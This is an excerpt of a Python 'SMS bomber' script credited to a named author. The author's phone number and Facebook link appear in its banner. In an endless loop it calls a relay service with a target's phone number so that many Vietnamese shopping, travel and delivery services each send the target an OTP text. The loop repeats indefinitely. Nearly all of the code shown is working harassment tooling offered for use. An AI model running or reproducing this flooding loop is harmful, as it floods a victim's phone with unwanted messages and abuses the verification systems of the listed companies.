...
Write.Print('Bản Quyền: Phạm Công Trình ( bú ) '+'\n' ,Colors.red_to_yellow, interval=0.005)
Write.Print('Zalo: 0828392226 '+'\n' ,Colors.red_to_yellow, interval=0.005)
Write.Print('Facebook: https://www.facebook.com/profile.php?id=100070655600636&mibextid=ZbWKwL '+'\n' ,Colors.red_to_yellow, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_yellow, interval=0.005)
...
while True:
    ...
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP The-Gioi-Di-Dong"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Nhap-Hang-247"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Elines"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Meta-VN"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Bach-Hoa-Xanh"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Grab-Food"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Sen OTP Tiki"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Go2joy"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    ...
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Agoda"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    Write.Print(f"[ {stt} ] [ PCT TOOL ] => Thanh Cong Send OTP Vieon"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
